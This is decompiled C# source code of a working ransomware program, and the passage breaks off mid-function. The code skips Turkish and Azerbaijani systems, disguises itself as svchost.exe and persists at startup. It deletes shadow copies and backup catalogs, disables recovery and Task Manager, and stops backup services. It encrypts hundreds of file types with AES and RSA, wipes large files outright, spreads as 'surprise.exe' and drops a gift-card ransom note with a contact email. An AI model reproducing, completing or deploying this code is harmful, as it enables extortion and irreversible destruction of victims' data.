using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "ez.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Please buy another gift card to access your files, 50$ is fine,", "", "buy 50 euro super rewarble gift card on google from G2A", "", "To access all your files", "", "copy paste the code and ", "", "send it to bones800@protonmail.com", "",
		"You have 7 days or PC will self-destruct", "", "https://www.g2a.com/rewarble-super-gift-card-50-eur-by-rewarble-key-global-i10000506957006", "", ""
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>4eIZ8o5oxyCVbGFFLQo4RaB5o6ai6IoGq9HPFsBUW4KEoqlS0t0w/hPBdEMK2663OYCBi4CIjWHh2BcLw1DtTli1/CVISdCXAt5BM7YN3bWpVLPIWMtSmMgmwR0YpyeYnriU+hfoTWwfsWyu2wxctdti7UIEfQo7yKiCyf8feG4eXkT3JRYDg8gaV24CUr6uk0m2t6wkUosljMH2qYuXGXG/DmygRWMrui7xP+ZYrC+k0BymhXPzLrkMrEIG9IfGCuZgpwtbR+CkRqGZC0AutWX/dhielofiEHREviRS81v/xnOLqira2APUgbyQWYQwFkp+s3jrSzg1gtLVilzrNQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
